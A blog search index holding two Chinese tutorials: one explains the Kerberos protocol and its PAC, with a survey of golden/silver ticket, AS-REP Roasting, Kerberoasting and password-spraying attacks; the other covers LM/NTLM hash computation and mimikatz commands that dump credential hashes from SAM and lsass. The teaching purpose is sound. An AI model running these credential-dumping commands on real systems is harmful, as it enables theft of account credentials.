<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Kerberos协议</title>
    <url>/posts/2d21762d/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Kerberos协议是一种网络身份认证协议，它是一个基于票据(Ticket)的系统，它允许实体在非安全网络环境下通信，向另一个实体以一种安全的方式证明自己的身份。Kerberos一词来源于古希腊神话的守护地狱的三头犬————Cerberus。<br>三头犬，意味着该协议认证由三方共同参与实现。三方分别是Key Distribution Center(KDC)，Client和Service。</p>
<h1 id="三大组成"><a href="#三大组成" class="headerlink" title="三大组成"></a>三大组成</h1><ol>
<li>Key Distribution Center: 翻译过来就是密钥分发中心，KDC是一种网络服务，它向目录活动区域内的用户和计算机提供会话票据和临时会话密钥，其服务账户为krbtgt。KDC作为活动目录域服务的一部分运行在每个域控上。</li>
<li>Client客户端: 每个客户端在访问资源之前都会进行请求身份验证。</li>
<li>Service服务端: 在域内提供服务，服务端有唯一的SPN(服务主体名称)。</li>
</ol>
<h1 id="Kerberos基础"><a href="#Kerberos基础" class="headerlink" title="Kerberos基础"></a>Kerberos基础</h1><p>看一下krbtgt账户</p>
<pre class="language-none"><code class="language-none">net user krbtgt</code></pre>
<p><img src="https://ooo.0x0.ooo/2024/05/15/OJ7NbN.png" alt="OJ7NbN.png" loading="lazy"><br>改账户密码是随机生成的，无法正常登录。</p>
<p>客户端想要访问某个Service,需要先购买该服务认可的票据ST(Service Ticket,服务票据)，等待服务验票之后才能访问。这张ST不能直接购买，需要一张TGT(Ticket Granting Ticket,认购权证)，TGT和ST都是KDC负发放的，因为KDC运行在DC上，所以说TGT和ST都是DC负责发放的。<br>Kerberos使用TCP&#x2F;UPD 88端口进行认证，使用 TCP&#x2F;UDP 464端口进行密码重设。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali2<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>
└─<span class="token comment"># nmap 192.168.31.195</span>
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-05-15 <span class="token number">20</span>:53 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.31.195
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00072s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">989</span> filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>
PORT     STATE SERVICE
<span class="token number">53</span>/tcp   <span class="token function">open</span>  domain
<span class="token number">88</span>/tcp   <span class="token function">open</span>  kerberos-sec
<span class="token number">135</span>/tcp  <span class="token function">open</span>  msrpc
<span class="token number">139</span>/tcp  <span class="token function">open</span>  netbios-ssn
<span class="token number">389</span>/tcp  <span class="token function">open</span>  ldap
<span class="token number">445</span>/tcp  <span class="token function">open</span>  microsoft-ds
<span class="token number">464</span>/tcp  <span class="token function">open</span>  kpasswd5
<span class="token number">593</span>/tcp  <span class="token function">open</span>  http-rpc-epmap
<span class="token number">636</span>/tcp  <span class="token function">open</span>  ldapssl
<span class="token number">3268</span>/tcp <span class="token function">open</span>  globalcatLDAP
<span class="token number">3269</span>/tcp <span class="token function">open</span>  globalcatLDAPssl
MAC Address: 00:0C:29:62:5C:EC <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>

Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">17.19</span> seconds</code></pre>

<p>Kerberos协议有两个基础认证模块————<strong>AS_REQ &amp; AS_REP</strong>和<strong>TGS_REQ &amp; TGS_REP</strong>以及微软扩展的两个认证模块<strong>S4U</strong>和<strong>PAC</strong>。<strong>S4U</strong>是微软为了实现委派而扩展的模块，分为<strong>S4u2Self</strong>和<strong>S4u2Proxy</strong>。在Kerberos最初设计的流程里只说明了如何证明客户端的真是身份，并没有说明客户端是否有权限访问该服务，因为在域中不同权限的用户能够访问的资源是不同的。微软为了解决权限这个问题，引入了<strong>PAC</strong>(Privilege Attribute Certificate,特权属性证书)的概念。</p>
<h1 id="PAC"><a href="#PAC" class="headerlink" title="PAC"></a>PAC</h1><p>在一个正常的Kerberos认证过程中，KDC返回的TGT和ST都包含PAC。这样保证在对资源的访问中，服务端接收到客户请求时候不在需要借助KDC提供完整的授权信息来对用户权限的判断，只需要根据请求种包含的PAC信息直接与本地资源的ACL相比较做出裁决。</p>
<h2 id="PAC结构"><a href="#PAC结构" class="headerlink" title="PAC结构"></a>PAC结构</h2><p> PAC的顶部结构:<br> <pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> ULONG<span class="token punctuation">;</span>
<span class="token keyword">typedef</span> <span class="token keyword">unsigned</span> <span class="token keyword">short</span> USHORT<span class="token punctuation">;</span>
<span class="token keyword">typedef</span> <span class="token keyword">unsigned</span> long64 ULONG64<span class="token punctuation">;</span>
<span class="token keyword">typedef</span> <span class="token keyword">unsigned</span> <span class="token keyword">char</span> UCHAR<span class="token punctuation">;</span>
<span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_PACTYPE</span> <span class="token punctuation">&#123;</span>
   ULONG cBuffers<span class="token punctuation">;</span>
   ULONGVersion<span class="token punctuation">;</span>
   PAC_INFO_BUFFER Buffers<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> PACTYPE<span class="token punctuation">;</span></code></pre><br>cBuffers: 包含数组缓冲区中的条目数<br>Version: 版本<br>Buffers: 包含一个PAC_INFO_BUFFER结构的数组</p>
<p><strong>PAC_INFO_BUFFER</strong>结构包含关于PAC每个部分的信息，结构如下:</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_PAC_INFO_BUFFER</span><span class="token punctuation">&#123;</span>
    ULONG ulType<span class="token punctuation">;</span>
    ULONG cbBufferSize<span class="token punctuation">;</span>
    ULONG64 Offset<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>PAC_INFO_BUFFER<span class="token punctuation">;</span></code></pre>
<p>ulType: 包含此缓冲区中的数据的类型，可能是</p>
<ol>
<li>Logon Info(1)</li>
<li>Client Info Type(10)</li>
<li>UPN DNS Info(12)</li>
<li>Server Checksum(6)</li>
<li>Privsvr Checksum(7)<br>cbBuuferSize: 缓冲大小<br>Offset：缓冲偏移量</li>
</ol>
<h2 id="PAC凭证信息"><a href="#PAC凭证信息" class="headerlink" title="PAC凭证信息"></a>PAC凭证信息</h2><p>Logon Info类型的PAC_LOGAN_INFO中包含Kerberos票据客户端的凭据信息。数据本身包含在一个KERB_VALIDATION_INFO结构中，该结构是由NDR编码的。NDR编码的输出被放置在Logon Info类型的PAC_INFO_BUFFER结构中。<br>该结构体重要的内容如下：<br>Acct Name: 对应的值是用户sAMAccountName属性的值<br>Full Name: 对应的值是用户displayName属性的值<br>User RID: 对应的值是用户的RID,也就是用户SID的最后部分<br>Group RID: 域用户的Group RID恒为<code>513</code>(也就是Domain Users的RID)，机器用户的Group RID恒为<code>515</code>(也就是Domain Computers的RID)，DC的Group RID恒为<code>516</code>(也就是Domain Controllers的RID)<br>Num RIDS: 用户所属组的个数<br>GroupIDS: 用户所属的所有组的RID</p>
<h2 id="PAC签名"><a href="#PAC签名" class="headerlink" title="PAC签名"></a>PAC签名</h2><p>PAC中包含两个数字签名:<strong>PAC_SERVER_CHECKSUM</strong>和<strong>PAC_PRISVR_CHECKSUM</strong>。PAC_SERVER_CHECKSUM使用服务密钥进行签名，而PAC_PRISVR_CHECKSUM使用KDC密钥进行签名。签名的原因由两个:</p>
<ol>
<li>存在带有服务密钥的签名，以验证此PAC已由服务签名</li>
<li>带有KDC密钥的签名是为了防止不受信任的服务用无效的PAC为自己伪造票据<br>这两个签名分别以PAC_SERVER_CHECKSUM和PAC_PRIVSVR_CHECKSUM类型的PAC_INFO_BUFFER发送。在PAC数据用于访问控制之前，必须检查PAC_SERVER_CHECKSUM签名，这将验证客户端是否知道服务的密钥。而PAC_PRIVSVR_CHECKSUM签名的验证是可选的，默认不开启。它用于验证PAC是否由KDC签发，而不是由KDC以外的具有访问服务密钥的第三方放入票据中。<br>签名包含在以下结构中:<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_PAC_SIGNATURE_DATA</span><span class="token punctuation">&#123;</span>
    ULONG SignatureType<span class="token punctuation">;</span>
    UCHARSignature<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>PAC_SIGNATURE_DATA<span class="token punctuation">,</span><span class="token operator">*</span>PPAC_SIGNATURE_DATA<span class="token punctuation">;</span></code></pre>
SignatureType: 包含用于创建签名的校验和的类型，校验和必须是一个键控的校验和。<br>Signature: 由一个包含校验和数据的字节数组组成。</li>
</ol>
<h2 id="KDC验证PAC"><a href="#KDC验证PAC" class="headerlink" title="KDC验证PAC"></a>KDC验证PAC</h2><p>当服务端收到客户端发来的AP-REQ消息时，只能校验PAC_SERVER_CHECKSUM签名，并不能校验PAC_PRIVSVR_CHECKSUM签名。<br>因此，如果要校验PAC_PRIVSVR_CHECKSUM签名，服务端还需要将客户端发来的ST中的PAC签名发给KDC进行校验。但是，由于大部分服务默认没有KDC验证PAC这一步，因此服务端就无须将ST中的PAC签名发给KDC校验了。<br>这也是<strong>白银票据攻击</strong>成功的前提，因为如果目标服务主机配置为需要校验PAC_PRIVSVR_CHECHSUM签名，服务端会将这个PAC的数字签名以KRB_VERIFY_PAC的消息通过RPC协议发送给KDC,KDC再将验证这个PAC的数字签名的结果以RPC返回码的形式发送给服务端，服务端就可以根据返回结果判断PAC的真实性和有效性。这样，就算攻击者拥有服务密钥，可以制作ST，也不能伪造KDC的PAC_PRIVSVR_CHECKSUM签名，自然就无法通过KDC签名校验。</p>
<p>那么，如何开启KDC签名校验？需满足以下条件:</p>
<ol>
<li>应用程序须有<strong>SeTcbPrivilege</strong>权限。SeTcbPrivilege权限允许为用户分配“作为操作系统的一部分”。本地系统，网络服务和本地服务账户都是由Windows定义的服务用户账户。每个账户都有一组特定的特权。</li>
<li>应用程序是一个服务，验证KDC PAC签名的注册表项被设置为1，默认为0。修改方法如下:<ol>
<li>启动注册表编辑器regedie.exe</li>
<li>找到以下子键: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters</li>
<li>添加一个ValidateKdcPacSignature的键值(DOWRD类型)。该值为0时，不会进行KDC PAC校验；该值为1时，会进行KDC PAC校验。因此可以将该设置为1，启用KDC PAC校验。</li>
</ol>
</li>
</ol>
<p><img src="https://ooo.0x0.ooo/2024/05/17/OJZGwb.png" alt="OJZGwb.png" loading="lazy"><br>我的电脑默认没开启。<br>对于验证KDC PAC签名的注册表键值，有以下几点注意事项：</p>
<ol>
<li>如果服务端并非一个服务程序，而是一个普通应用程序，它将不受上面注册表的影响，而总会进行KDC PAC的校验。</li>
<li>如果服务端并非一个程序，而是一个驱动，其认证过程在系统内核内完成，它将不受以上注册表的影响，而永不进行KDC PAC的校验。</li>
<li>使用以上注册表项，需要在Windows Server 2003 SP2或更新的操作系统中进行。</li>
<li>运行在Windows Server 2008或更新操作系统的服务器上，该注册表项的值默认为0(默认没有ValidateKdcPacSignature键值)，也就是不进行KDC PAC校验。例如我的计算机。</li>
<li>注册在本地系统账户下的服务，无论如何配置都不会触发KDC PAC签名校验，如SMB,SCIFS,HOST等服务无论如何都不会触发KDC PAC的校验。</li>
</ol>
<p>为何默认不进行KDC PAC的验证?<br>因为如何执行KDC验证PAC，意味着有响应时间和带宽使用方面的成本。它需要占用带宽在应用服务器和KDC之间传输请求和响应，这可能导致大容量应用程序服务器中出现一些性能问题。在这样的环境中，用户身份验证可能导致额外的网络延迟和大量的流量。</p>
<h2 id="PAC在Kerberos中的优缺点"><a href="#PAC在Kerberos中的优缺点" class="headerlink" title="PAC在Kerberos中的优缺点"></a>PAC在Kerberos中的优缺点</h2><ol>
<li>无PAC情况<br><img src="https://ooo.0x0.ooo/2024/05/17/OJZYfa.png" alt="OJZYfa.png" loading="lazy"></li>
<li>有PAC情况<br><img src="https://ooo.0x0.ooo/2024/05/17/OJZl5S.png" alt="OJZl5S.png" loading="lazy"></li>
</ol>
<p>But，PAC的引入并不是完全有利的，PAC在用户认证的时候会导致认证耗时过长。Windows Kerberos客户端会通过RPC调用KDC上的函数来验证PAC信息，这时候用户会观察到在服务断与KDC之间的RPC包流量的增加。而另一方面，由于PAC是微软特有的一个特性，所以启用了PAC的域中不支持装有其他操作系统的服务器，制约了域配置的灵活性。在2014年，PAC的安全性还导致产生了一个域内及其严重的提取漏洞MS14-068。</p>
<h1 id="Kerberos完整认证过程"><a href="#Kerberos完整认证过程" class="headerlink" title="Kerberos完整认证过程"></a>Kerberos完整认证过程</h1><p><img src="https://ooo.0x0.ooo/2024/05/18/OJgH5p.png" alt="OJgH5p.png" loading="lazy"></p>
<h2 id="AS-REQ-AS-REP"><a href="#AS-REQ-AS-REP" class="headerlink" title="AS-REQ&amp;AS-REP"></a>AS-REQ&amp;AS-REP</h2><p><img src="https://ooo.0x0.ooo/2024/05/18/OJgLKU.png" alt="OJgLKU.png" loading="lazy"><br>Server的TGT是由KDC的AS(Authentication Server，认证服务)发放的&#x2F;</p>
<ol>
<li><p>AS-REQ分析<br>当域内某个用户想要访问域内某个服务时，输入用户名和密码，本机就会向KDC的AS发送一个AS-REQ的请求包。AS-REQ请求包有如下字段：<br>PA-DATA pA-ENC-TIMESTAMP:预认证,就是用用户Hash加密时间戳作为value发送给KDC的AS。然后KDC从活动目录中查询出用户的Hash，使用用户Hash进行解密，获得时间戳。如果能解密，且时间戳在一定范围内，则证明认证通过。由于是使用用户密码Hash加密时间的时间戳，因此造成了PTH攻击。<br>PA-DATA pA-PAC-REQUEST: 启用PAC支持的扩展，这里value对应的值为True或Fasse，KDC根据include的值来确定返回的票据中是否需要携带PAC。<br>include-pac: 是否包含PAC，True表示包含<br>kdc-options: 用于与KDC协商一些选项设置<br>cname: 请求的用户名，这个用户木存在与否，返回的包是有差异的，因此可以用于<strong>枚举域内用户名</strong>。当用户名存在时，密码正确与否是否会影响返回包，因此也可以进行<strong>密码喷洒</strong>。<br>realm: 域名<br>sname: 请求的服务，包含type和value。在AS-REQ中sname始终未krbtgt。</p>
</li>
<li><p>AS-REP<br>当KDC的AS接收到客户端发来的AS-REQ后,AS会从活动目录数据库中取出该用户的密钥，然后用该密钥对请求包中的预认证部分进行解密。如果解密成功，并且时间戳在有效范围内，则证明请求者提供的用户密钥正确。KDC的AS在成功认证客户端的身份之后，发送AS-REP包给客户端。<br>AS-REP包有如下主要字段：<br>ticket: 认购权证票据<br>enc-part(ticket中的): TGT中的加密部分，这部分是用krbtgt的密码Hash加密的。因此如果拥有krbtgt的Hash就可以自己制作一个ticket，这就造成了<strong>黄金票据</strong>传递攻击<br>enc-part(最外层的): Logon Session Key,这部分是用请求的用户密码Hash加密的，作为下一阶段的认证密钥。</p>
</li>
</ol>
<p>AS-REP包中最重要的就是TGT和加密的Logon Session Key。TGT中加密部分是使用krbrgt密钥加密的，而Logon Session Key是使用请求的用户密钥加密的。</p>
<p>(1)TGT<br>AS-REP包中的ticket便是TGT。TGT中包含一些明文信息，如版本号tkt-vno，域名realm，请求的服务名sname，最重要的是加密部分。加密部分是使用krbrgt账户密钥加密，主要包含Logon Session Key，请求的用户木cname，域名crealm，认证时间authtime，认证到期时间endtime，authorization-data等信息。其中authorization-dataq部分包含客户端的身份权限等信息，这些信息包含在PAC中。</p>
<p>KDC生成PAC的过程: KDC在收到客户端发来的AS-REQ后，从请求中取出cname字段，然后查询活动目录数据库，找到sAMAccountName属性为cname字段的值用户，用该用户的身份生成一个对应的PAC。</p>
<p>(2)Logon Session Key<br>AS-REP包最外层的部分就是加密的Logon Session Key,用于确保客户端和KDC下一阶段的通信安全，它使用请求的用户密钥加密。</p>
<h2 id="TGS-REQ-TGS-REP"><a href="#TGS-REQ-TGS-REP" class="headerlink" title="TGS-REQ &amp; TGS-REP"></a>TGS-REQ &amp; TGS-REP</h2><p><img src="https://ooo.0x0.ooo/2024/05/18/OJgH5p.png" alt="OJgH5p.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/05/28/OJPSd1.png" alt="OJPSd1.png" loading="lazy"><br>客户端收到KDC的AS-REP后，使用用户密钥解密enc_Logon Session Key,得到Logon Session Key，并且也获得了TGT。之后它会在本地缓存此Logon Session Key。客户端需要凭借这张TGT向KDC购买响应的<code>ST</code>。ST是KDC的另一个服务<code>TGS</code>(Ticket Granting Service)授予的。在这个阶段，微软引入了两个扩展自协议<code>S4u2Self</code>和<code>S4u2Proxy</code>。</p>
<ol>
<li>TGS-REQ分析<br>客户端用上一步获得的TGT发起TGS-ERQ向KDC购买ST。TGS-REQ包主要有如下字段：<br><strong>padata:</strong> 包含<code>ap_req</code>，这个是TGS_REQ必须携带的部分，这部分包含AS_REP中获取到的<code>TGT</code>票据和使用原始的Logon Session Key加密的时间戳。可能会有PA_FOR_USER，类型是S4u2Self，是唯一的标识符，指示用户的身份，由用户名和域名组成。S4u2Proxy必须扩展PA_FOR_USER结构，用于指定服务代表某个用户去请求针对服务自身的Kerberos服务票据。还可能会有PA_PAC_OPTIONS，类型是PA_PAC_OPTIONS。S4u2Proxy必须扩展PA-PAC-OPTIONS结构。如果是基于资源的约束性委派，就需要只当Resourse-based Constrained Delegation位。<br><strong>ap-req:</strong> 这个是TGS_REQ必须携带的部分。<br><strong>ticket:</strong> AS-REP回复包中返回的TGT<br><strong>authenticator:</strong> 原始Logon Session Key加密的时间戳，用于保证会话安全。</li>
<li>TGS-REP分析<br>KDC的TGS服务接收到TGS-REQ之后会进行如下操作。首先，使用krbrgt密钥解密TGT中的加密部分，得到Logon Session Key和PAC等信息，解密成功则说明该TGT是KDC颁发的；然后，验证PAC的签名，签名正确证明PAC未经过篡改；最后，使用Logon Session Key解密authenticator得到的时间戳等信息，如果能够解密成功，并且票据时间在有效范围内，则验证了会话的安全性。<br>在完成上述检测后，KDC的TGS就完成了对客户端的认证，TGS发送回复包给客户端。(TGS-REP中的KDC并不会验证客户端是否有权限访问服务端，因此，不管用户有没有访问服务的权限，只要TGT正确，均会返回ST)<br>TGS-REP包的主要字段：<br><strong>ticker:</strong> ST<br><strong>enc-part(ticket内层):</strong> 这部分是用服务的密钥加密的<br><strong>enc-part(外层)</strong> 这部分用原始的Logon Session Key加密，里面最重要的字段是<code>Service Session Key</code>，作为下一阶段的认证密钥</li>
</ol>
<h2 id="AP-REP-AP-REP双向认证"><a href="#AP-REP-AP-REP双向认证" class="headerlink" title="AP-REP&amp;AP-REP双向认证"></a>AP-REP&amp;AP-REP双向认证</h2><p><img src="https://ooo.0x0.ooo/2024/05/18/OJgH5p.png" alt="OJgH5p.png" loading="lazy"><br><img src="https://ooo.0x0.ooo/2024/05/28/OJPcOI.png" alt="OJPcOI.png" loading="lazy"><br>客户端收到KDC返回的TGS-REP消息后，从中取出ST，准备开始申请访问服务。</p>
<ol>
<li>AP-REQ包分析<br>客户端收到KDC的TGS回复后，通过缓存的Logon Session Key解密<code>enc_Service Session Key</code>得到<code>Service Session Key</code>，同时也拿到了<code>ST</code>。<code>Service Session Key</code>和<code>ST</code>会被客户端缓存。客户端访问指定服务时，将发起AP-REQ。该包的主要字段：<br><strong>ticket:</strong> 票据<br><strong>authenticator:</strong> Service Session Key加密的时间戳</li>
<li>AP-REP包分析<br>这一步是可选的，当客户端希望验证提供服务的服务端时(也就是AP-REQ请求中<code>mutual-required选项为True</code>)，服务端返回AP-REP消息。服务端收到客户端发来的AP-REQ消息后，通过服务密钥解密ST得到Service Session Key和PAC等消息，然乎用Service Session Key解密Authenticator得到时间戳。如果解密成功且时间戳在有效范围内，则验证了了客户端的身份。验证客户端身份后，服务端从ST中取出PAC代表用户身份权限信息的数据，然后与请求的服务<code>ACL</code>做对比，生成响应的访问令牌。同时，服务端会检查AP-REQ请求中<code>matual-required</code>选项是否为True，如果是，则说明客户端向验证服务端的身份。此时，服务端会用Service Session Key加密时间戳作为Authenticator，在AP-REP包中发送给客户端进行验证。如果mutual-required选项为False，服务端会根据访问令牌的权限决定是否返回响应的服务给客户端。</li>
</ol>
<h2 id="S4u2Self-S4u2Proxy协议"><a href="#S4u2Self-S4u2Proxy协议" class="headerlink" title="S4u2Self&amp;S4u2Proxy协议"></a>S4u2Self&amp;S4u2Proxy协议</h2><p>为了在Kerberos协议层面对约束性委派进行支持，微软对Kerberos协议扩展了两个自协议:S4u2Self(Service for User to Self)和S4u2Proxy(Service for User to Proxy)。S4u2Self可以代表任意用户请求针对自身的服务票据;S4u2Self可以用上一步获得的ST以用户的名义请求针对其他指定服务的ST。</p>
<ol>
<li>S4u2Self<br>和正常的TGS-REQ包相比，S4u2Self协议的TGS-REQ包会多一个<code>PA-DATA pA-FOR-USER</code>,name为要模拟的用户，并且sname也是请求的服务自身。</li>
<li>S4u2Proxy<br>和正常的TGS-REQ包相比，S4u2Proxy协议的TGS-REQ包会增加一个<code>additional-tickets</code>字段，该字段的内容就是上一步利用S4u2Self请求的ST。</li>
</ol>
<h2 id="Kerberos协议的安全问题"><a href="#Kerberos协议的安全问题" class="headerlink" title="Kerberos协议的安全问题"></a>Kerberos协议的安全问题</h2><p><img src="https://ooo.0x0.ooo/2024/05/28/OJPdND.png" alt="OJPdND.png" loading="lazy"><br>在AS-REQ阶段，使用的是用户密码Hash或AES Key加密的时间戳。当只获得了用户密码<strong>Hash</strong>时，发起AS-REQ会造成<strong>PTH攻击</strong>；当只获得用户密码的<strong>AES Key</strong>时，发起AS-REQ会造成<strong>PTK攻击</strong>。<br>AS-REQ包中cname代表用户名，这个值存在和不存在，返回的包不一样，所以可以用于枚举域内用户名，这种攻击方式被称为域内用户枚举攻击(当未获取到有效域用户权限时，可以使用这个方法枚举域内用户)。当用户木存在，密码正确和错误时，返回的包也不一样，所以可以进行用户木密码爆破。<br>在实战中，常常使用<strong>密码喷洒</strong>(Password Spraying)攻击方式。对密码进行喷洒式的攻击，其属于自动化密码猜测的一种。这种针对所有用户的自动密码喷洒通常是为了避免账户被锁定，因为针对同一个用户的连续密码猜测会导致账户被锁定，所以只有对所有用户同时执行特定的密码登录，才能增加破解的概率，并且避免账户被锁定。普通的爆破就是用户名固定爆破密码，但是密码喷洒是用固定的密码去爆破所有的用户名。</p>
<p>在AS-REP阶段，由于返回的TGT是由krbtgt用户的密码Hash加密的，因此如果有krbtgt的密码Hash就可以自己制作一个TGT，这个票据也被称为黄金票据，这种攻击方式被称为黄金票据传递攻击。同样，在TGS-REP阶段，TGS-REP中的ST是使用服务的Hash进行加密的，如果我们拥有服务的Hash就可以签发任意用户的ST，这个票据也被称为白银票据，这种攻击方式被称为白银票据传递攻击。相较于黄金票据传递攻击，白银票据传递攻击使用的是要访问服务的Hash，而不是krbtgt的Hash。</p>
<p>在AS-REP阶段，Logon Session Key是用用户密码的Hash加密的。对于域用户，如果设置了<code>Do not reqire Kerberos preauthentication</code>(不需要预认证)选项，攻击者会向域控的88端口发送AS_REQ,此时域控不会做任何验证就将TGT和该用户的Hash加密的Logon Session Key返回。这样，攻击者就可以对获取到的用户Hash加密的Logon Session Key进行破解，如果破解成功，就能拿到该用户的密码明文，这种攻击方式被称为<strong>AS-REP Roasting攻击</strong>。</p>
<p>在TGS-REP阶段，由于ST是用服务Hash加密的，因此，如果我们能获取到ST，就可以对该ST进行破解，得到服务的Hash，造成<strong>Kerberoasting攻击</strong>。这种攻击方式存在的另一个原因是用户向KDC发起TGS-REQ请求时，不管用户对服务有没有访问权限，只要TGT正确,KDC都会返回ST。其实AS_REQ中的服务就是krbtgt，也就是说这种攻击方式同样可以用于爆破AS_REP中的TGT，但之所以没见到这种攻击方式是因为krbtgt的密码是随机生成的，爆破不出来。</p>
]]></content>
      <categories>
        <category>AD域</category>
      </categories>
      <tags>
        <tag>windows协议</tag>
      </tags>
  </entry>
  <entry>
    <title>NTLM协议</title>
    <url>/posts/b774aeb/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><strong>NTLM(New Technology LAN Manager)<strong>协议是微软用于Windows身份验证的主要协议之一。继</strong>SMB</strong>、<strong>LM</strong>协议之后微软提出了NTLM协议，这一协议安全性更高，不仅可以用于工作组中的机器身份验证，又可以用于域环境身份验证，还可以为SMB、HTTP、LDAP、SMTP等上层应用提供身份验证。</p>
<h1 id="LM-Hash加密算法"><a href="#LM-Hash加密算法" class="headerlink" title="LM Hash加密算法"></a>LM Hash加密算法</h1><p>LM Hash本质是DES加密，但是LM Hash容易破解，从Windows Vista和Windows Server2008开始，Windows默认禁用LM Hash。<br>LM Hash加密明文限制在14位，如果密文大于14位，说明LM Hash位空值或者被禁用。<br>LM Hash加密流程</p>
<ol>
<li><p>将用户明文转化成大写，并转16进制<br>如 p@ssw0rd -&gt;P@SSW0RD-&gt;5040535357305244</p>
</li>
<li><p>如果转换后的十六进制字符串长度不足14B(28)，用0补全<br>5040535357305244-&gt;5040535357305244000000000000</p>
</li>
<li><p>将14B分为两组，每组7B，然后转二进制<br>50405353573052-&gt;01010000010000000101001101010011010101110011000001010010<br>44000000000000-&gt;01000100000000000000000000000000000000000000000000000000</p>
</li>
<li><p>将每组二进制数据按7bit一组，分为8组，每组末尾添0，再转16进制<br>  01010000010000000101001101010011010101110011000001010010<br>-&gt;01010000  00100000  00010100  01101010  00110100  10111000  11000000  10100100<br>-&gt;5020146a34b8c0a4</p>
</li>
</ol>
<p>  01000100000000000000000000000000000000000000000000000000<br>-&gt;01000100  00000000  00000000  00000000  00000000  00000000  00000000  00000000<br>-&gt;4400000000000000</p>
<ol start="5">
<li><p>将两组16进制字符串作为DES密钥对<code>KGS!@#$%</code>进行加密，然后将DES加密后的密文进行拼接得到LM Hash的值<br>5020146a34b8c0a4-&gt;921988BA001DC8E1<br>4400000000000000-&gt;4A3B108F3FA6CB6D<br>LM Hash:921988BA001DC8E14A3B108F3FA6CB6D</p>
</li>
<li><p>验证<br><img src="https://ooo.0x0.ooo/2024/05/09/OJaSSc.png" alt="OJaSSc.png" loading="lazy"></p>
</li>
</ol>
<p>LM Hash因为不安全容易受到爆破攻击所以几乎不再使用，特别是如果密文长度小于7,那个第二个分组加密后的结果一定为 <code>aad3b435b51404ee</code><br>如果LM Hash被禁用LM Hash的值为<code>aad3b435b51404eeaad3b435b51404ee</code></p>
<h1 id="NTLM-Hash加密算法"><a href="#NTLM-Hash加密算法" class="headerlink" title="NTLM Hash加密算法"></a><strong>NTLM Hash加密算法</strong></h1><p>NTLM Hash加密流程</p>
<ol>
<li><p>将用户密码转换为十六进制<br>123456-&gt;31 32 33 34 35 36</p>
</li>
<li><p>将十六进制格式的密码转换成Unicode格式，即在每个字节之后添加0x00<br>31 32 33 34 35 36-&gt;310032003300340035003600</p>
</li>
<li><p>使用MD4对Unicode编码数据进行Hash计算<br>310032003300340035003600-&gt;32ed87bdb5fdc5e9cba88547376818d4</p>
</li>
<li><p>python实现<br><code>python -c &quot;import hashlib,binascii;print(&#39;NTLM_Hash:&#39;+binascii.hexlify(hashlib.new(&#39;md4&#39;, &#39;123456&#39;.encode(&#39;utf-16le&#39;)).digest()).decode(&#39;utf-8&#39;))&quot; NTLM_Hash:32ed87bdb5fdc5e9cba88547376818d4</code><br><img src="https://ooo.0x0.ooo/2024/05/09/OJad1M.png" alt="OJad1M.png" loading="lazy"></p>
</li>
<li><p>验证<br><img src="https://ooo.0x0.ooo/2024/05/09/OJa0wr.png" alt="OJa0wr.png" loading="lazy"></p>
</li>
</ol>
<h1 id="Windows系统存储的NTLM-Hash"><a href="#Windows系统存储的NTLM-Hash" class="headerlink" title="Windows系统存储的NTLM Hash"></a><strong>Windows系统存储的NTLM Hash</strong></h1><p>用户密码经过NTLM Hash加密后存储在<strong>C:\Windows\system32\config\SAM</strong>文件中，当用户在进行身份认证的时候，输入密码，系统对用户输入的密码进行NTLM Hash处理，如果结果和SAM文件中的NTLM Hash相同，则认证成功。<br>当用户注销，重启，锁屏后，操作系统会让<strong>winlogon.exe</strong>显示登录界面，<strong>winlogon.exe</strong>接受输入，将密码交给<strong>lsass.exe</strong>进程，<strong>lsass.exe</strong>进程中会存一份明文密码，进行NTLM Hash加密与SAM比较。<br>mimikatz抓取NTLM Hash就是通过抓取<strong>lsass.exe</strong>内存中凭据。<br>由于无法直接打开SAM文件，所以使用<strong>mimikatz</strong>工具读取<br>按照常规操作<code>privilege::debug</code>-&gt;<code>sekurlsa::logonpasswords</code>对win11是不启用的<br>按照一下操作<code>privilege::debug</code>-&gt;<code>token::elevate</code>-&gt;<code>lsadump::sam</code><br><img src="https://ooo.0x0.ooo/2024/05/09/OJaC8s.png" alt="OJaC8s.png" loading="lazy"><br>拿到了我自己的HTLM Hash<br>使用MSF或者CS通过转存Hash抓取到的密码格式是:<br><code>用户名:用户SID值:KM Hash:HTLM Hash:::</code><br>一般第三位就是<strong>aad3b435b51404eeaad3b435b51404ee</strong><br><img src="https://ooo.0x0.ooo/2024/05/09/OJoOJa.png" alt="OJoOJa.png" loading="lazy"><br>可以看到第三位是aad3b435b51404eeaad3b435b51404ee，第四位是我的NTLM Hash值</p>
